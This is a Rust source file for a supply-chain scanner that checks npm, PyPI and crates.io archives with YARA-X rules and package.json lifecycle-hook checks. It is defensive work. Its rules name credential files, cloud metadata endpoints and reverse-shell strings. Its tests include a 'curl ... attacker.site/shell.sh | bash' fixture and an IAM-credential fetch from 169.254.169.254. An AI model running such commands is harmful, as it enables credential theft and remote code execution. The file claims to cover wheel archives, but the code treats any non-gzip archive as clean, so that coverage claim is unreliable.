//! In-line Package Security & Supply Chain Scanner powered by YARA-X.
//!
//! Inspects package archives (.tgz, .crate, .tar.gz, .whl) streamed from package registries
//! (npm, PyPI, Crates.io) in real time for:
//! - Dropper scripts (e.g. Mini Shai-Hulud in Keyv compromise)
//! - Credential scrapers (.npmrc, AWS, SSH keys, Vault, etc.)
//! - Cloud metadata harvesting (AWS IMDS 169.254.169.254, ECS)
//! - Suspicious lifecycle scripts (`preinstall`, `postinstall`, `install`)
//! - Reverse shells, remote script execution droppers (`curl | sh`)
//! - Direct exfiltration webhooks (Discord, Telegram, pastebin)

use conduit_common::config::PackageScannerConfig;
use flate2::read::GzDecoder;
use std::io::Read;
use std::sync::Arc;
use tar::Archive;
use tracing::{info, warn};
use yara_x::{Compiler, Rules, Scanner};

const BUILTIN_YARA_RULES: &str = r#"
rule npm_shai_hulud_dropper {
    meta:
        description = "Detects Mini Shai-Hulud dropper/stealer seen in Keyv and related npm compromises"
        author = "Conduit Security Gateway"
        severity = "critical"
    strings:
        $bun_dl = "github.com/oven-sh/bun/releases/download" ascii nocase
        $c2_domain = "npm-cache.com" ascii nocase
        $eth_c2 = "0xE1f2395ee43e45A1556EC6438a88c31B83493103" ascii
        $stealer_fn1 = "Math_Symbol.js" ascii
        $stealer_fn2 = "math_init.js" ascii
        $worm_tag = "Shai-Hulud: Here We Go Again" ascii
        $oidc_steal = "ACTIONS_ID_TOKEN_REQUEST_TOKEN" ascii
    condition:
        any of them
}

rule cloud_metadata_credential_scraper {
    meta:
        description = "Detects attempts to harvest cloud instance metadata (AWS IMDS, ECS) from package code"
        author = "Conduit Security Gateway"
        severity = "high"
    strings:
        $imds_v4 = "169.254.169.254" ascii
        $ecs_v4 = "169.254.170.2" ascii
        $secrets_mgr = "secretsmanager:ListSecrets" ascii
    condition:
        any of them
}

rule supply_chain_token_harvester {
    meta:
        description = "Detects code harvesting developer and host secrets (npmrc, aws, ssh, vault)"
        author = "Conduit Security Gateway"
        severity = "high"
    strings:
        $npmrc = ".npmrc" ascii
        $auth_token = "_authToken" ascii
        $aws_cred = ".aws/credentials" ascii
        $ssh_id = "id_rsa" ascii
        $ssh_ed = "id_ed25519" ascii
        $vault = "VAULT_TOKEN" ascii
        $whoami = "registry.npmjs.org/-/whoami" ascii
    condition:
        2 of them
}

rule reverse_shell_and_exec_dropper {
    meta:
        description = "Detects reverse shells and download-exec droppers in package scripts"
        author = "Conduit Security Gateway"
        severity = "critical"
    strings:
        $curl_sh = /curl\s+-[sSkL]+\s+https?:\/\/[^\s]+\s*\|\s*(ba)?sh/ ascii
        $wget_sh = /wget\s+-[qO-]+\s+https?:\/\/[^\s]+\s*\|\s*(ba)?sh/ ascii
        $rev_shell1 = "/bin/sh -i" ascii
        $rev_shell2 = "/bin/bash -i" ascii
        $nc_e = /nc(\.traditional)?\s+-[a-zA-Z]*e\s+/ ascii
        $ps_enc = /powershell(\.exe)?\s+-[eE](ncodedcommand)?\s+[A-Za-z0-9+\/=]{20,}/ ascii
    condition:
        any of them
}

rule discord_c2_exfiltration {
    meta:
        description = "Detects direct exfiltration to Discord webhooks from package code"
        author = "Conduit Security Gateway"
        severity = "high"
    strings:
        $discord_webhook = /https:\/\/(canary\.|ptb\.)?discord(app)?\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+/ ascii
    condition:
        $discord_webhook
}

rule suspicious_eval_obfuscation {
    meta:
        description = "Detects heavily obfuscated eval and hex/unicode payload loaders"
        author = "Conduit Security Gateway"
        severity = "medium"
    strings:
        $eval1 = /(window|global|globalThis)\[["']eval["']\]/ ascii
        $eval2 = /(eval|Function)\s*\(\s*(atob|unescape|decodeURIComponent)/ ascii
        $hex_seq = /\\x[0-9a-fA-F]{2}\\x[0-9a-fA-F]{2}\\x[0-9a-fA-F]{2}\\x[0-9a-fA-F]{2}\\x[0-9a-fA-F]{2}/ ascii
    condition:
        2 of them
}
"#;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PackageScanAction {
    Block,
    Log,
}

#[derive(Debug, Clone)]
pub struct PackageThreatMatch {
    pub rule_name: String,
    pub description: String,
    pub infected_file: String,
}

#[derive(Debug, Clone)]
pub enum PackageScanResult {
    Clean,
    Threat(PackageThreatMatch),
}

pub struct PackageScanner {
    rules: Arc<Rules>,
    pub enabled: bool,
    pub action: PackageScanAction,
    pub max_package_size: usize,
    pub max_file_scan_size: usize,
}

impl PackageScanner {
    pub fn new(config: &PackageScannerConfig) -> Self {
        let action = match config.action.as_str() {
            "log" => PackageScanAction::Log,
            _ => PackageScanAction::Block,
        };

        let mut compiler = Compiler::new();
        if let Err(e) = compiler.add_source(BUILTIN_YARA_RULES) {
            warn!("Failed to compile built-in YARA-X rules: {e}");
        }

        // If custom rules are specified, compile them as well
        if let Some(ref path) = config.custom_rules_path {
            if let Ok(content) = std::fs::read_to_string(path) {
                if let Err(e) = compiler.add_source(content.as_str()) {
                    warn!("Failed to compile custom YARA-X rules from {path}: {e}");
                } else {
                    info!("Loaded custom YARA-X rules from {path}");
                }
            }
        }

        let rules = Arc::new(compiler.build());
        info!("Package scanner initialized with YARA-X supply chain engine");

        Self {
            rules,
            enabled: config.enabled,
            action,
            max_package_size: config.max_package_size,
            max_file_scan_size: config.max_file_scan_size,
        }
    }

    /// Determines if an HTTP response represents a package archive download.
    pub fn is_package_download(host: &str, path: &str, content_type: Option<&str>) -> bool {
        let path_lower = path.to_lowercase();
        let ct_lower = content_type.unwrap_or("").to_lowercase();

        // Host-specific indicators
        let is_npm = host.contains("registry.npmjs.org")
            || host.contains("registry.yarnpkg.com")
            || host.contains("npm.pkg.github.com");
        let is_pypi = host.contains("files.pythonhosted.org") || host.contains("pypi.org");
        let is_crates = host.contains("crates.io") || host.contains("static.crates.io");
        let is_rubygems = host.contains("rubygems.org");

        // File extensions
        let has_archive_ext = path_lower.ends_with(".tgz")
            || path_lower.ends_with(".tar.gz")
            || path_lower.ends_with(".crate")
            || path_lower.ends_with(".whl")
            || path_lower.ends_with(".gem");

        if (is_npm || is_pypi || is_crates || is_rubygems)
            && (has_archive_ext || ct_lower.contains("gzip") || ct_lower.contains("octet-stream"))
        {
            return true;
        }

        has_archive_ext
    }

    /// Scans a package archive (.tgz / .tar.gz) using in-memory decompression and YARA-X rules.
    pub fn scan_tarball(&self, data: &[u8]) -> PackageScanResult {
        if !self.enabled || data.is_empty() {
            return PackageScanResult::Clean;
        }

        let gz = GzDecoder::new(data);
        let mut archive = Archive::new(gz);

        let entries = match archive.entries() {
            Ok(e) => e,
            Err(_) => return PackageScanResult::Clean, // Not a valid gzipped tarball
        };

        let mut scanner = Scanner::new(&self.rules);

        for entry in entries {
            let mut entry = match entry {
                Ok(e) => e,
                Err(_) => continue,
            };

            let file_path = match entry.path() {
                Ok(p) => p.to_string_lossy().to_string(),
                Err(_) => continue,
            };

            let path_lower = file_path.to_lowercase();

            // We only inspect manifest and script files; skip media, fonts, large binaries
            let should_inspect = path_lower.ends_with(".json")
                || path_lower.ends_with(".js")
                || path_lower.ends_with(".mjs")
                || path_lower.ends_with(".cjs")
                || path_lower.ends_with(".py")
                || path_lower.ends_with(".sh")
                || path_lower.ends_with(".bash")
                || path_lower.ends_with(".ps1")
                || path_lower.ends_with(".bat")
                || path_lower.ends_with(".env");

            if !should_inspect {
                continue;
            }

            let file_size = entry.size() as usize;
            if file_size > self.max_file_scan_size {
                continue; // Skip oversized single files
            }

            let mut content = Vec::with_capacity(file_size.min(1024 * 64));
            if entry.read_to_end(&mut content).is_err() {
                continue;
            }

            // 1. If it's package.json, check for suspicious lifecycle script hooks
            if path_lower.ends_with("package.json") {
                if let Some(threat) = Self::inspect_package_json(&content, &file_path) {
                    return PackageScanResult::Threat(threat);
                }
            }

            // 2. Scan file content against YARA-X rules
            if let Ok(scan_results) = scanner.scan(&content) {
                for matched_rule in scan_results.matching_rules() {
                    let rule_name = matched_rule.identifier().to_string();
                    let description = "Supply-chain malicious pattern match".to_string();

                    info!(
                        rule = %rule_name,
                        file = %file_path,
                        "YARA-X supply chain rule matched inside package"
                    );

                    return PackageScanResult::Threat(PackageThreatMatch {
                        rule_name,
                        description,
                        infected_file: file_path,
                    });
                }
            }
        }

        PackageScanResult::Clean
    }

    /// Inspects `package.json` for suspicious lifecycle scripts.
    fn inspect_package_json(content: &[u8], file_path: &str) -> Option<PackageThreatMatch> {
        let v: serde_json::Value = serde_json::from_slice(content).ok()?;
        let scripts = v.get("scripts")?.as_object()?;

        // High-risk lifecycle hooks
        let hook_keys = ["preinstall", "install", "postinstall"];

        for hook in hook_keys {
            if let Some(cmd) = scripts.get(hook).and_then(|c| c.as_str()) {
                let cmd_lower = cmd.to_lowercase();

                // Suspicious dropper or reverse shell patterns in lifecycle scripts
                let suspicious = cmd_lower.contains("setup.mjs")
                    || cmd_lower.contains("node setup")
                    || cmd_lower.contains("curl ")
                    || cmd_lower.contains("wget ")
                    || cmd_lower.contains("powershell")
                    || cmd_lower.contains("| sh")
                    || cmd_lower.contains("| bash")
                    || cmd_lower.contains("node -e")
                    || cmd_lower.contains("eval(");

                if suspicious {
                    return Some(PackageThreatMatch {
                        rule_name: "suspicious_lifecycle_script".to_string(),
                        description: format!("Hook '{hook}' executes suspicious command: {cmd}"),
                        infected_file: file_path.to_string(),
                    });
                }
            }
        }

        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use flate2::write::GzEncoder;
    use flate2::Compression;
    use tar::Builder;

    fn test_scanner() -> PackageScanner {
        PackageScanner::new(&PackageScannerConfig {
            enabled: true,
            action: "block".into(),
            max_package_size: 15 * 1024 * 1024,
            max_file_scan_size: 2 * 1024 * 1024,
            custom_rules_path: None,
        })
    }

    fn create_test_tarball(files: &[(&str, &[u8])]) -> Vec<u8> {
        let enc = GzEncoder::new(Vec::new(), Compression::default());
        let mut builder = Builder::new(enc);

        for &(name, data) in files {
            let mut header = tar::Header::new_gnu();
            header.set_path(name).unwrap();
            header.set_size(data.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            builder.append(&header, data).unwrap();
        }

        builder.into_inner().unwrap().finish().unwrap()
    }

    #[test]
    fn test_clean_package_passes() {
        let scanner = test_scanner();
        let files = [
            (
                "package/package.json",
                br#"{"name":"safe-pkg","version":"1.0.0"}"# as &[u8],
            ),
            (
                "package/index.js",
                b"module.exports = function hello() { return 'world'; };",
            ),
        ];
        let tarball = create_test_tarball(&files);
        match scanner.scan_tarball(&tarball) {
            PackageScanResult::Clean => {}
            PackageScanResult::Threat(t) => panic!("Expected clean, got threat: {:?}", t),
        }
    }

    #[test]
    fn test_detect_shai_hulud_dropper() {
        let scanner = test_scanner();
        let files = [
            ("package/package.json", br#"{"name":"keyv-malicious","version":"6.0.0","scripts":{"preinstall":"node setup.mjs"}}"# as &[u8]),
            ("package/setup.mjs", b"const url = 'https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-linux-x64';\nexecFileSync('bun', ['Math_Symbol.js']);"),
        ];
        let tarball = create_test_tarball(&files);
        match scanner.scan_tarball(&tarball) {
            PackageScanResult::Threat(t) => {
                assert!(
                    t.rule_name == "suspicious_lifecycle_script"
                        || t.rule_name == "npm_shai_hulud_dropper"
                );
            }
            PackageScanResult::Clean => panic!("Expected threat detection for Keyv dropper!"),
        }
    }

    #[test]
    fn test_detect_cloud_imds_scraper() {
        let scanner = test_scanner();
        let files = [
            ("package/package.json", br#"{"name":"imds-scraper","version":"1.0.0"}"# as &[u8]),
            ("package/lib/metadata.js", b"const http = require('http'); http.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/');"),
        ];
        let tarball = create_test_tarball(&files);
        match scanner.scan_tarball(&tarball) {
            PackageScanResult::Threat(t) => {
                assert_eq!(t.rule_name, "cloud_metadata_credential_scraper");
            }
            PackageScanResult::Clean => panic!("Expected cloud IMDS scraper detection!"),
        }
    }

    #[test]
    fn test_detect_reverse_shell_dropper() {
        let scanner = test_scanner();
        let files = [
            (
                "package/package.json",
                br#"{"name":"bad-shell","version":"1.0.0"}"# as &[u8],
            ),
            (
                "package/install.sh",
                b"curl -sSL https://attacker.site/shell.sh | bash",
            ),
        ];
        let tarball = create_test_tarball(&files);
        match scanner.scan_tarball(&tarball) {
            PackageScanResult::Threat(t) => {
                assert_eq!(t.rule_name, "reverse_shell_and_exec_dropper");
            }
            PackageScanResult::Clean => panic!("Expected reverse shell detection!"),
        }
    }

    #[test]
    fn test_is_package_download_filter() {
        assert!(PackageScanner::is_package_download(
            "registry.npmjs.org",
            "/keyv/-/keyv-6.0.0.tgz",
            Some("application/octet-stream")
        ));
        assert!(PackageScanner::is_package_download(
            "files.pythonhosted.org",
            "/packages/foo/foo-1.0.0.whl",
            Some("application/zip")
        ));
        assert!(PackageScanner::is_package_download(
            "static.crates.io",
            "/crates/serde/serde-1.0.0.crate",
            Some("application/x-tar")
        ));
        assert!(!PackageScanner::is_package_download(
            "example.com",
            "/index.html",
            Some("text/html")
        ));
    }
}
